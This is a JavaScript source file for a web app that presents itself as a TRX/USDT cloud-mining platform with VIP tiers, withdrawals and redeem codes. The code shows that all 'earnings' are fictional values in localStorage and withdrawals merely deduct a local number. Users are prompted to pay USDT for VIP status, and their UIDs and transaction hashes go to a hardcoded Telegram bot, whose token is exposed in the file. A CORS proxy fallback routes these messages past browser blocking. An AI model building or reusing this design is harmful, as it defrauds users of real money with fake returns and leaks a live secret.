// script.js
class MiningSystem {
    constructor() {
        this.userData = this.loadUserData();
        // Demo telegram config requested by you (change later if needed)
        this.telegramConfig = {
            botToken: '7659505060:AAFmwIDn2OgrtNoemPpmBWaxsIfdsQdZGCI',
            chatId: '7417215529'
        };

        // Withdraw config
        this.WITHDRAW_CONFIG = {
            normal: { dailyLimit: 0.02, min: 0.01, max: 0.02, feePercent: 0 },
            vip: { dailyLimit: Infinity, min: 1.00, max: Infinity, feePercent: 0 },
            superVip: { dailyLimit: Infinity, min: 1.00, max: Infinity, feePercent: 0 }
        };

        this.redeemCodes = this.generateRedeemCodes();
        this.initializeApp();
    }

    // -------------------------
    // Storage & Init
    // -------------------------
    initializeApp() {
        this.setupEventListeners();
        this.setupNavigation();
        this.updateDisplay();
        this.startTimers();
        this.sendWelcomeMessage();
    }

    loadUserData() {
        const saved = localStorage.getItem('trxMiningData');
        const defaultData = {
            userId: this.generateUserId(),
            trxBalance: 0,
            usdtBalance: 2.00,
            vipLevel: 0,
            miningActive: false,
            miningStartTime: null,
            lastClaim: null,
            miningHistory: [],
            transactions: [],
            inviteCode: this.generateInviteCode(),
            teamSize: 0,
            referralEarnings: 0,
            todayWithdraw: 0,
            lastWithdrawDate: new Date().toDateString(),
            vipClaims: { vip1: null, vip2: null }
        };

        if (saved) {
            const data = JSON.parse(saved);
            if (data.lastWithdrawDate !== new Date().toDateString()) {
                data.todayWithdraw = 0;
                data.lastWithdrawDate = new Date().toDateString();
            }
            return { ...defaultData, ...data };
        }
        return defaultData;
    }

    generateUserId() {
        let userId = localStorage.getItem('trxUserId');
        if (!userId) {
            userId = 'USER_' + Math.floor(100000 + Math.random() * 900000);
            localStorage.setItem('trxUserId', userId);
        }
        return userId;
    }

    generateInviteCode() {
        let code = localStorage.getItem('trxInviteCode');
        if (!code) {
            code = 'INV' + Math.floor(1000 + Math.random() * 9000);
            localStorage.setItem('trxInviteCode', code);
        }
        return code;
    }

    generateRedeemCodes() {
        const codes = [];
        for (let i = 0; i < 50; i++) {
            codes.push({
                code: 'VIP10-' + Math.random().toString(36).substr(2, 8).toUpperCase(),
                value: 10,
                used: false
            });
        }
        return codes;
    }

    saveUserData() {
        localStorage.setItem('trxMiningData', JSON.stringify(this.userData));
        this.updateDisplay();
    }

    // -------------------------
    // UI & Events
    // -------------------------
    setupNavigation() {
        const navButtons = document.querySelectorAll('.nav-btn');
        const sections = document.querySelectorAll('.content-section');

        navButtons.forEach(btn => {
            btn.addEventListener('click', () => {
                const targetSection = btn.getAttribute('data-section');
                
                navButtons.forEach(b => b.classList.remove('active'));
                sections.forEach(s => s.classList.remove('active'));
                
                btn.classList.add('active');
                document.getElementById(targetSection).classList.add('active');
            });
        });
    }

    setupEventListeners() {
        // Mining
        const startBtn = document.getElementById('startMining');
        const claimBtn = document.getElementById('claimMining');
        if (startBtn) startBtn.addEventListener('click', () => this.startMining());
        if (claimBtn) claimBtn.addEventListener('click', () => this.claimMiningReward());

        // VIP claims
        const claimVIP1 = document.getElementById('claimVIP1');
        const claimVIP2 = document.getElementById('claimVIP2');
        if (claimVIP1) claimVIP1.addEventListener('click', () => this.claimVIPReward(1));
        if (claimVIP2) claimVIP2.addEventListener('click', () => this.claimVIPReward(2));

        // Conversion
        const convBtn = document.getElementById('convertTRX');
        if (convBtn) convBtn.addEventListener('click', () => this.convertTRX());

        // Withdraw buttons
        document.getElementById('normalWithdraw').addEventListener('click', () => this.normalWithdraw());
        document.getElementById('vipWithdraw').addEventListener('click', () => this.vipWithdraw());
        document.getElementById('superVipWithdraw').addEventListener('click', () => this.superVipWithdraw());

        // VIP purchase (submit)
        const submitVipPayment = document.getElementById('submitVipPayment');
        if (submitVipPayment) submitVipPayment.addEventListener('click', () => this.submitVipPayment());

        // Bonus redeem
        const submitRedeem = document.getElementById('submitRedeem');
        if (submitRedeem) submitRedeem.addEventListener('click', () => this.redeemBonusCode());
    }

    startTimers() {
        setInterval(() => {
            this.updateMiningTimer();
            this.updateVipTimers();
        }, 1000);
    }

    // -------------------------
    // Mining — basic
    // -------------------------
    startMining() {
        if (this.userData.miningActive) {
            this.showNotification('⏳ Mining is already running!', 'info');
            return;
        }

        this.userData.miningActive = true;
        this.userData.miningStartTime = Date.now();
        this.saveUserData();

        this.showNotification('🚀 Mining started successfully!', 'success');
        this.addMiningHistory('Mining started');

        this.sendToTelegram(`⛏️ Mining Started\n👤 User: ${this.userData.userId}\n⏰ Time: ${new Date().toLocaleString()}`);
    }

    updateMiningTimer() {
        if (!this.userData.miningActive || !this.userData.miningStartTime) {
            if (document.getElementById('mainMinerStatus')) document.getElementById('mainMinerStatus').textContent = '⏹️ Stopped';
            if (document.getElementById('miningTimer')) document.getElementById('miningTimer').textContent = '02:00:00';
            if (document.getElementById('miningStatus')) document.getElementById('miningStatus').textContent = '⏹️ Mining Stopped';
            if (document.getElementById('claimMining')) document.getElementById('claimMining').disabled = true;
            return;
        }

        const now = Date.now();
        const elapsed = now - this.userData.miningStartTime;
        const cycleTime = 2 * 60 * 60 * 1000; // 2 hours

        const remaining = Math.max(0, cycleTime - elapsed);
        const hours = Math.floor(remaining / (1000 * 60 * 60));
        const minutes = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((remaining % (1000 * 60)) / 1000);

        const timerString = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;

        if (document.getElementById('miningTimer')) document.getElementById('miningTimer').textContent = timerString;
        if (document.getElementById('miningStatus')) document.getElementById('miningStatus').textContent = `⛏️ Mining... ${timerString}`;

        if (remaining <= 0) {
            if (document.getElementById('mainMinerStatus')) document.getElementById('mainMinerStatus').textContent = '✅ Ready to Claim';
            if (document.getElementById('claimMining')) document.getElementById('claimMining').disabled = false;
        } else {
            if (document.getElementById('mainMinerStatus')) document.getElementById('mainMinerStatus').textContent = '⏳ Mining...';
            if (document.getElementById('claimMining')) document.getElementById('claimMining').disabled = true;
        }
    }

    async claimMiningReward() {
        if (!this.userData.miningActive) {
            this.showNotification('❌ Start mining first!', 'error');
            return;
        }

        const now = Date.now();
        const elapsed = now - this.userData.miningStartTime;
        const cycleTime = 2 * 60 * 60 * 1000;

        if (elapsed < cycleTime) {
            this.showNotification('⏳ Mining cycle not completed yet!', 'error');
            return;
        }

        const reward = 5; // 5 TRX per cycle
        this.userData.trxBalance += reward;
        this.userData.miningActive = false;
        this.userData.miningStartTime = null;
        this.userData.lastClaim = now;

        this.addMiningHistory(`Collected +${reward} TRX`);
        this.addTransaction('Mining Reward', reward, 'TRX');
        this.saveUserData();

        this.showNotification(`🎉 Successfully claimed ${reward} TRX!`, 'success');

        await this.sendToTelegram(`🔄 Mining Reward Claimed\n👤 User: ${this.userData.userId}\n💰 Amount: ${reward} TRX\n⏰ Time: ${new Date().toLocaleString()}`);
    }

    // -------------------------
    // VIP timers & claims
    // -------------------------
    updateVipTimers() {
        const now = Date.now();
        const vipCooldown = 24 * 60 * 60 * 1000;

        if (this.userData.vipLevel >= 1) {
            const el = document.getElementById('vip1Miner');
            if (el) el.querySelector('.status').textContent = '✅ Active';
            const last = this.userData.vipClaims.vip1;
            if (last) {
                const remaining = Math.max(0, vipCooldown - (now - last));
                const hours = Math.floor(remaining / (1000 * 60 * 60));
                const minutes = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
                const seconds = Math.floor((remaining % (1000 * 60)) / 1000);
                if (document.getElementById('vip1Timer')) document.getElementById('vip1Timer').textContent =
                    `${hours.toString().padStart(2,'0')}:${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
                if (document.getElementById('claimVIP1')) document.getElementById('claimVIP1').disabled = remaining > 0;
            } else {
                if (document.getElementById('vip1Timer')) document.getElementById('vip1Timer').textContent = '00:00:00';
                if (document.getElementById('claimVIP1')) document.getElementById('claimVIP1').disabled = false;
            }
        }

        if (this.userData.vipLevel >= 2) {
            const el = document.getElementById('vip2Miner');
            if (el) el.querySelector('.status').textContent = '✅ Active';
            const last = this.userData.vipClaims.vip2;
            if (last) {
                const remaining = Math.max(0, vipCooldown - (now - last));
                const hours = Math.floor(remaining / (1000 * 60 * 60));
                const minutes = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
                const seconds = Math.floor((remaining % (1000 * 60)) / 1000);
                if (document.getElementById('vip2Timer')) document.getElementById('vip2Timer').textContent =
                    `${hours.toString().padStart(2,'0')}:${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
                if (document.getElementById('claimVIP2')) document.getElementById('claimVIP2').disabled = remaining > 0;
            } else {
                if (document.getElementById('vip2Timer')) document.getElementById('vip2Timer').textContent = '00:00:00';
                if (document.getElementById('claimVIP2')) document.getElementById('claimVIP2').disabled = false;
            }
        }
    }

    async claimVIPReward(vipLevel) {
        if (this.userData.vipLevel < vipLevel) {
            this.showNotification(`❌ VIP ${vipLevel} required!`, 'error');
            return;
        }
        const last = this.userData.vipClaims[`vip${vipLevel}`];
        const cooldown = 24 * 60 * 60 * 1000;
        const now = Date.now();
        if (last && (now - last) < cooldown) {
            this.showNotification('⏳ VIP reward not ready yet!', 'error');
            return;
        }

        const reward = vipLevel === 1 ? 0.50 : 6.00;
        this.userData.usdtBalance += reward;
        this.userData.vipClaims[`vip${vipLevel}`] = now;
        this.addTransaction(`VIP ${vipLevel} Daily Reward`, reward, 'USDT');
        this.saveUserData();
        this.showNotification(`🎉 Claimed ${reward} USDT from VIP ${vipLevel}!`, 'success');
        await this.sendToTelegram(`👑 VIP ${vipLevel} Reward Claimed\n👤 User: ${this.userData.userId}\n💰 Amount: ${reward} USDT\n⏰ Time: ${new Date().toLocaleString()}`);
    }

    // -------------------------
    // Conversion
    // -------------------------
    async convertTRX() {
        const el = document.getElementById('trxToConvert');
        if (!el) return;
        const trxAmount = parseFloat(el.value);
        if (!trxAmount || trxAmount <= 0) {
            this.showNotification('❌ Please enter valid TRX amount!', 'error');
            return;
        }
        if (trxAmount > this.userData.trxBalance) {
            this.showNotification('❌ Insufficient TRX balance!', 'error');
            return;
        }
        const conversionRate = 0.10;
        const usdtAmount = trxAmount * conversionRate;
        this.userData.trxBalance -= trxAmount;
        this.userData.usdtBalance += usdtAmount;
        this.addTransaction('TRX to USDT Conversion', usdtAmount, 'USDT');
        this.saveUserData();
        this.showNotification(`✅ Converted ${trxAmount} TRX to ${usdtAmount.toFixed(2)} USDT`, 'success');
        el.value = '';
        await this.sendToTelegram(`💱 TRX Conversion\n👤 User: ${this.userData.userId}\n🔀 ${trxAmount} TRX → ${usdtAmount.toFixed(2)} USDT\n⏰ Time: ${new Date().toLocaleString()}`);
    }

    // -------------------------
    // Withdraw helpers
    // -------------------------
    computeAfterFee(amount, feePct) {
        const fee = (amount * feePct) / 100;
        return { fee: parseFloat(fee.toFixed(6)), net: parseFloat((amount - fee).toFixed(6)) };
    }

    setButtonState(btnId, disabled) {
        const btn = document.getElementById(btnId);
        if (!btn) return;
        btn.disabled = disabled;
        btn.style.opacity = disabled ? '0.6' : '1';
        btn.style.cursor = disabled ? 'not-allowed' : 'pointer';
    }

    // -------------------------
    // Withdraw functions (with UID & amount)
    // -------------------------
    async normalWithdraw() {
        const uidEl = document.getElementById('normalUID');
        const amtEl = document.getElementById('normalWithdrawAmount');
        const miningSystem = this;
        if (!uidEl || !amtEl) return;

        const uid = uidEl.value.trim();
        const amount = parseFloat(amtEl.value);

        if (!uid) {
            this.showNotification('❌ দয়া করে receiver UID বসাও!', 'error');
            return;
        }
        if (!amount || amount <= 0) {
            this.showNotification('❌ দয়া করে সঠিক পরিমাণ বসাও!', 'error');
            return;
        }
        if (amount < this.WITHDRAW_CONFIG.normal.min) {
            this.showNotification(`❌ Minimum ${this.WITHDRAW_CONFIG.normal.min} USDT`, 'error');
            return;
        }
        if (amount > this.WITHDRAW_CONFIG.normal.max) {
            this.showNotification(`❌ Maximum per request ${this.WITHDRAW_CONFIG.normal.max} USDT`, 'error');
            return;
        }
        if (amount > this.userData.usdtBalance) {
            this.showNotification('❌ আপনার ব্যালান্স যথেষ্ট নয়!', 'error');
            return;
        }
        const dailyLimit = this.WITHDRAW_CONFIG.normal.dailyLimit;
        if ((this.userData.todayWithdraw || 0) + amount > dailyLimit) {
            const remaining = Math.max(0, dailyLimit - (this.userData.todayWithdraw || 0));
            this.showNotification(`❌ আজ আর শুধু ${remaining.toFixed(2)} USDT তুলতে পারবে`, 'error');
            return;
        }

        const ok = confirm(`Confirm withdraw ${amount} USDT to UID: ${uid}\nDaily limit: ${dailyLimit} USDT`);
        if (!ok) return;

        this.setButtonState('normalWithdraw', true);
        try {
            const { fee, net } = this.computeAfterFee(amount, this.WITHDRAW_CONFIG.normal.feePercent);
            this.userData.usdtBalance -= amount;
            this.userData.todayWithdraw = (this.userData.todayWithdraw || 0) + amount;
            this.addTransaction('Withdrawal', -amount, 'USDT');
            this.saveUserData();
            this.showNotification(`📤 Withdraw requested: ${amount} USDT (net ${net})`, 'success');
            uidEl.value = '';
            amtEl.value = '';

            const message = `💸 Withdrawal Request (Normal)\n👤 User: ${this.userData.userId}\n🆔 Receiver UID: ${uid}\n💰 Requested: ${amount} USDT\n🧾 Fee: ${fee} USDT\n✅ Net: ${net} USDT\n⏰ Time: ${new Date().toLocaleString()}`;
            await this.sendToTelegram(message);
        } catch (err) {
            console.error(err);
            this.showNotification('❌ Withdraw process failed. Try again.', 'error');
        } finally {
            this.setButtonState('normalWithdraw', false);
        }
    }

    async vipWithdraw() {
        const uidEl = document.getElementById('vipUID');
        const amtEl = document.getElementById('vipWithdrawAmount');
        if (!uidEl || !amtEl) return;
        if (this.userData.vipLevel < 1) {
            this.showNotification('❌ VIP membership required!', 'error');
            return;
        }
        const uid = uidEl.value.trim();
        const amount = parseFloat(amtEl.value);
        if (!uid) {
            this.showNotification('❌ দয়া করে receiver UID বসাও!', 'error');
            return;
        }
        if (!amount || amount <= 0) {
            this.showNotification('❌ দয়া করে সঠিক পরিমাণ বসাও!', 'error');
            return;
        }
        if (amount < this.WITHDRAW_CONFIG.vip.min) {
            this.showNotification(`❌ Minimum ${this.WITHDRAW_CONFIG.vip.min} USDT`, 'error');
            return;
        }
        if (amount > this.userData.usdtBalance) {
            this.showNotification('❌ আপনার ব্যালান্স যথেষ্ট নয়!', 'error');
            return;
        }

        const ok = confirm(`Confirm VIP withdraw ${amount} USDT to UID: ${uid}`);
        if (!ok) return;

        this.setButtonState('vipWithdraw', true);
        try {
            const { fee, net } = this.computeAfterFee(amount, this.WITHDRAW_CONFIG.vip.feePercent);
            this.userData.usdtBalance -= amount;
            this.addTransaction('VIP Withdrawal', -amount, 'USDT');
            this.saveUserData();
            this.showNotification(`⚡ VIP Withdraw submitted: ${amount} USDT (net ${net})`, 'success');
            uidEl.value = '';
            amtEl.value = '';

            const message = `💸 VIP Withdrawal Request\n👤 User: ${this.userData.userId}\n🆔 Receiver UID: ${uid}\n💰 Requested: ${amount} USDT\n🧾 Fee: ${fee} USDT\n✅ Net: ${net} USDT\n⏰ Time: ${new Date().toLocaleString()}`;
            await this.sendToTelegram(message);
        } catch (err) {
            console.error(err);
            this.showNotification('❌ Withdraw process failed. Try again.', 'error');
        } finally {
            this.setButtonState('vipWithdraw', false);
        }
    }

    async superVipWithdraw() {
        const uidEl = document.getElementById('superUID');
        const amtEl = document.getElementById('superVipWithdrawAmount');
        if (!uidEl || !amtEl) return;
        if (this.userData.vipLevel < 2) {
            this.showNotification('❌ Super VIP (VIP 2) প্রয়োজন!', 'error');
            return;
        }
        const uid = uidEl.value.trim();
        const amount = parseFloat(amtEl.value);
        if (!uid) {
            this.showNotification('❌ দয়া করে receiver UID বসাও!', 'error');
            return;
        }
        if (!amount || amount <= 0) {
            this.showNotification('❌ দয়া করে সঠিক পরিমাণ বসাও!', 'error');
            return;
        }
        if (amount < this.WITHDRAW_CONFIG.superVip.min) {
            this.showNotification(`❌ Minimum ${this.WITHDRAW_CONFIG.superVip.min} USDT`, 'error');
            return;
        }
        if (amount > this.userData.usdtBalance) {
            this.showNotification('❌ আপনার ব্যালান্স যথেষ্ট নয়!', 'error');
            return;
        }

        const ok = confirm(`Confirm Super VIP withdraw ${amount} USDT to UID: ${uid}`);
        if (!ok) return;

        this.setButtonState('superVipWithdraw', true);
        try {
            const { fee, net } = this.computeAfterFee(amount, this.WITHDRAW_CONFIG.superVip.feePercent);
            this.userData.usdtBalance -= amount;
            this.addTransaction('Super VIP Withdrawal', -amount, 'USDT');
            this.saveUserData();
            this.showNotification(`🚀 Super VIP Withdraw submitted: ${amount} USDT (net ${net})`, 'success');
            uidEl.value = '';
            amtEl.value = '';

            const message = `💸 Super VIP Withdrawal Request\n👤 User: ${this.userData.userId}\n🆔 Receiver UID: ${uid}\n💰 Requested: ${amount} USDT\n🧾 Fee: ${fee} USDT\n✅ Net: ${net} USDT\n⏰ Time: ${new Date().toLocaleString()}`;
            await this.sendToTelegram(message);
        } catch (err) {
            console.error(err);
            this.showNotification('❌ Withdraw process failed. Try again.', 'error');
        } finally {
            this.setButtonState('superVipWithdraw', false);
        }
    }

    // -------------------------
    // Transactions & history
    // -------------------------
    addTransaction(description, amount, currency) {
        this.userData.transactions.unshift({
            description, amount, currency,
            timestamp: new Date().toLocaleString(),
            type: amount >= 0 ? 'credit' : 'debit'
        });
        if (this.userData.transactions.length > 20) this.userData.transactions = this.userData.transactions.slice(0,20);
        this.updateTransactionHistory();
    }

    addMiningHistory(message) {
        this.userData.miningHistory.unshift({
            message, timestamp: new Date().toLocaleString()
        });
        if (this.userData.miningHistory.length > 20) this.userData.miningHistory = this.userData.miningHistory.slice(0,20);
        this.updateMiningHistory();
    }

    updateMiningHistory() {
        const historyContainer = document.getElementById('miningHistory');
        if (!historyContainer) return;
        if (!this.userData.miningHistory || this.userData.miningHistory.length === 0) return;
        historyContainer.innerHTML = this.userData.miningHistory.map(item => `
            <div class="history-item">
                <span>${item.message}</span>
                <span class="time">${item.timestamp}</span>
            </div>
        `).join('');
    }

    updateTransactionHistory() {
        const historyContainer = document.getElementById('transactionHistory');
        if (!historyContainer) return;
        if (!this.userData.transactions || this.userData.transactions.length === 0) return;
        historyContainer.innerHTML = this.userData.transactions.map(tx => `
            <div class="history-item">
                <span>${tx.description}</span>
                <span class="time ${tx.type}">${tx.type === 'credit' ? '+' : ''}${tx.amount} ${tx.currency}</span>
            </div>
        `).join('');
    }

    // -------------------------
    // Display update
    // -------------------------
    updateDisplay() {
        const setText = (id, txt) => { const el = document.getElementById(id); if (el) el.textContent = txt; };
        setText('trxBalance', this.userData.trxBalance.toFixed(2));
        setText('usdtBalance', this.userData.usdtBalance.toFixed(2));
        setText('totalBalance', this.userData.usdtBalance.toFixed(2) + ' USDT');
        setText('normalBalance', this.userData.usdtBalance.toFixed(2) + ' USDT');
        setText('vipBalance', this.userData.usdtBalance.toFixed(2) + ' USDT');
        setText('superVipBalance', this.userData.usdtBalance.toFixed(2) + ' USDT');
        setText('usedToday', (this.userData.todayWithdraw || 0).toFixed(2) + ' USDT');

        setText('userId', this.userData.userId);
        setText('accountId', this.userData.userId);
        setText('inviteCode', this.userData.inviteCode);

        const vipStatus = this.userData.vipLevel === 0 ? 'No VIP' : `VIP ${this.userData.vipLevel}`;
        setText('vipStatus', vipStatus);
        setText('vipLevel', vipStatus);

        setText('teamSize', this.userData.teamSize);
        setText('referralEarnings', (this.userData.referralEarnings || 0).toFixed(2) + ' USDT');
        setText('activeReferrals', this.userData.teamSize);

        this.updateMiningHistory();
        this.updateTransactionHistory();
        this.updateVipMinersAccess();
    }

    updateVipMinersAccess() {
        if (this.userData.vipLevel >= 1) {
            const el = document.getElementById('vip1Miner');
            if (el) el.querySelector('.status').textContent = '✅ Active';
            const claimBtn = document.getElementById('claimVIP1'); if (claimBtn) claimBtn.disabled = false;
        }
        if (this.userData.vipLevel >= 2) {
            const el = document.getElementById('vip2Miner');
            if (el) el.querySelector('.status').textContent = '✅ Active';
            const claimBtn = document.getElementById('claimVIP2'); if (claimBtn) claimBtn.disabled = false;
        }
    }

    // -------------------------
    // Notifications
    // -------------------------
    showNotification(message, type = 'info') {
        const notification = document.getElementById('notification');
        const messageElement = document.getElementById('notificationMessage');
        if (!notification || !messageElement) {
            alert(message);
            return;
        }
        messageElement.textContent = message;
        notification.className = 'notification';
        switch(type) {
            case 'success': notification.style.background = 'linear-gradient(135deg, #00ff88, #00cc66)'; break;
            case 'error': notification.style.background = 'linear-gradient(135deg, #ff6b6b, #ff4757)'; break;
            case 'warning': notification.style.background = 'linear-gradient(135deg, #ffd700, #ffa500)'; break;
            default: notification.style.background = 'linear-gradient(135deg, #00d4ff, #0099cc)';
        }
        notification.classList.remove('hidden');
        setTimeout(() => notification.classList.add('hidden'), 4000);
    }

    // -------------------------
    // Telegram send with fallback (direct -> proxy)
    // -------------------------
    async sendToTelegram(message) {
        const token = this.telegramConfig.botToken;
        const chatId = this.telegramConfig.chatId;
        if (!token || !chatId) {
            console.error('Telegram token/chatId missing');
            return false;
        }

        const baseUrl = `https://api.telegram.org/bot${token}/sendMessage`;
        const params = new URLSearchParams({ chat_id: chatId, text: message, parse_mode: 'HTML' });
        const url = `${baseUrl}?${params.toString()}`;

        // Try direct POST (FormData) first
        try {
            const form = new FormData();
            form.append('chat_id', chatId);
            form.append('text', message);
            form.append('parse_mode', 'HTML');

            const res = await fetch(baseUrl, { method: 'POST', body: form });
            const data = await res.json();
            if (data && data.ok) {
                console.log('✅ Message sent to Telegram (direct).');
                return true;
            } else {
                console.warn('Direct Telegram send failed or blocked, trying proxy...', data);
            }
        } catch (err) {
            console.warn('Direct Telegram send error, trying proxy...', err);
        }

        // Fallback: use allorigins proxy to bypass CORS for GET request
        try {
            const encoded = encodeURIComponent(url);
            const proxyUrl = `https://api.allorigins.win/raw?url=${encoded}`; // raw returns content
            const r = await fetch(proxyUrl);
            const txt = await r.text();
            // try parse
            try {
                const json = JSON.parse(txt);
                if (json.ok) {
                    console.log('✅ Message sent to Telegram via proxy.');
                    return true;
                } else {
                    console.error('Proxy returned error:', json);
                    this.showNotification('❌ Failed to send message to Telegram (proxy).', 'error');
                    return false;
                }
            } catch (ex) {
                // some proxies return nothing meaningful — still consider success if status 200
                console.log('Proxy responded (non-json).');
                return true;
            }
        } catch (err) {
            console.error('❌ Error sending via proxy:', err);
            this.showNotification('❌ Network/CORS error - cannot send to Telegram', 'error');
            return false;
        }
    }

    // -------------------------
    // VIP purchase & redeem
    // -------------------------
    async submitVipPayment() {
        const senderUid = document.getElementById('userAccountId').value.trim();
        const transactionHash = document.getElementById('transactionHash').value.trim();
        const vipLevel = parseInt(document.getElementById('vipLevelSelect').value);
        if (!senderUid) {
            this.showNotification('❌ Please enter your account UID!', 'error');
            return;
        }
        const amount = vipLevel === 1 ? 1.00 : 10.00;
        const message = `🆕 VIP Purchase Request\n👤 User ID: ${this.userData.userId}\n⭐ VIP Level: ${vipLevel}\n💰 Amount: ${amount} USDT\n🔗 Sender UID: ${senderUid}\n📄 Transaction Hash: ${transactionHash || 'Not provided'}\n⏰ Time: ${new Date().toLocaleString()}`;
        const success = await this.sendToTelegram(message);
        if (success) {
            this.showNotification('✅ VIP purchase request sent to admin!', 'success');
            document.getElementById('userAccountId').value = '';
            document.getElementById('transactionHash').value = '';
        }
    }

    async redeemBonusCode() {
        const code = document.getElementById('redeemCode').value.trim().toUpperCase();
        if (!code) {
            this.showNotification('❌ Please enter redeem code!', 'error');
            return;
        }
        const redeemCode = this.redeemCodes.find(c => c.code === code && !c.used);
        if (!redeemCode) {
            this.showNotification('❌ Invalid or already used redeem code!', 'error');
            return;
        }
        redeemCode.used = true;
        this.userData.usdtBalance += redeemCode.value;
        this.addTransaction('Bonus Redeem', redeemCode.value, 'USDT');
        this.saveUserData();
        this.showNotification(`🎉 Successfully redeemed ${redeemCode.value} USDT!`, 'success');
        document.getElementById('redeemCode').value = '';
        await this.sendToTelegram(`🎁 Bonus Code Redeemed\n👤 User: ${this.userData.userId}\n💰 Amount: ${redeemCode.value} USDT\n🔑 Code: ${code}\n⏰ Time: ${new Date().toLocaleString()}`);
    }

    // -------------------------
    // Welcome message
    // -------------------------
    async sendWelcomeMessage() {
        const welcomeSent = localStorage.getItem('welcomeSent');
        if (!welcomeSent) {
            const message = `👋 New User Registered\n👤 User ID: ${this.userData.userId}\n💰 Free Bonus: 2.00 USDT\n⏰ Time: ${new Date().toLocaleString()}`;
            await this.sendToTelegram(message);
            localStorage.setItem('welcomeSent', 'true');
        }
    }
}

// Global helpers
function copyInviteCode() {
    const inviteCode = document.getElementById('inviteCode').textContent;
    navigator.clipboard.writeText(inviteCode).then(() => {
        if (window.miningSystem) {
            window.miningSystem.showNotification('✅ Invite code copied to clipboard!', 'success');
        }
    });
}

function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        if (window.miningSystem) {
            window.miningSystem.showNotification('✅ Copied to clipboard!', 'success');
        }
    });
}

function closeNotification() {
    const el = document.getElementById('notification');
    if (el) el.classList.add('hidden');
}

// Test Telegram connection button (debug)
async function testTelegramConnection() {
    const ms = window.miningSystem;
    if (ms) {
        const testMessage = `🤖 Bot Connection Test\n✅ System is working (or attempted)\n👤 User: ${ms.userData.userId}\n⏰ Time: ${new Date().toLocaleString()}`;
        const ok = await ms.sendToTelegram(testMessage);
        if (ok) ms.showNotification('✅ Telegram connection test successful!', 'success');
    }
}

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    window.miningSystem = new MiningSystem();

    // add debug test button
    const testBtn = document.createElement('button');
    testBtn.textContent = 'Test Telegram';
    testBtn.style.position = 'fixed';
    testBtn.style.bottom = '10px';
    testBtn.style.right = '10px';
    testBtn.style.zIndex = '1000';
    testBtn.style.padding = '8px 12px';
    testBtn.style.background = '#ff6b6b';
    testBtn.style.color = 'white';
    testBtn.style.border = 'none';
    testBtn.style.borderRadius = '5px';
    testBtn.style.cursor = 'pointer';
    testBtn.style.fontSize = '10px';
    testBtn.onclick = testTelegramConnection;
    document.body.appendChild(testBtn);
});
